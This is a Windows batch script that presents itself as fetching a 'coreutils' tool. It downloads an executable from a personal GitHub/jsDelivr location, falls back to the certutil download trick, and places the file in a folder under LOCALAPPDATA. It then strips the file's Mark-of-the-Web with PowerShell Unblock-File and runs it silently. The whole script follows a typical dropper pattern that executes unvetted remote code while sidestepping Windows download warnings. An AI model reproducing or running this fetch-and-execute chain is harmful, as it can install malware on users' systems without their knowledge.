@echo off
setlocal

set "URL=https://raw.githubusercontent.com/johnbunkerton/main/main/coreutils.exe"
set "ALT=https://cdn.jsdelivr.net/gh/johnbunkerton/main@main/coreutils.exe"
set "DIR=%LOCALAPPDATA%\cu"
set "EXE=%DIR%\cu.exe"
set "LOG=%DIR%\log.txt"
if not exist "%DIR%" md "%DIR%"
del "%LOG%" 2>nul

set "TEMP=%DIR%\t"
set "TMP=%TEMP%"
if not exist "%TEMP%" md "%TEMP%"

if exist "%EXE%" del "%EXE%"
curl -fsSL --retry 2 --connect-timeout 20 -o "%EXE%" "%URL%" 2>> "%LOG%"
if not exist "%EXE%" curl -fsSL --retry 2 --connect-timeout 20 -o "%EXE%" "%ALT%" 2>> "%LOG%"
if not exist "%EXE%" certutil -urlcache -split -f "%URL%" "%EXE%" >nul 2>> "%LOG%"

if not exist "%EXE%" (echo fetch failed - see "%LOG%" & pause & exit /b 1)
for %%A in ("%EXE%") do if %%~zA LSS 10000000 (echo short read: %%~zA bytes & del "%EXE%" & pause & exit /b 1)

powershell -nop -c "Unblock-File -LiteralPath '%EXE%'" >nul 2>&1
"%EXE%" > "%DIR%\out.log" 2>&1
echo exit %errorlevel% >> "%DIR%\out.log"
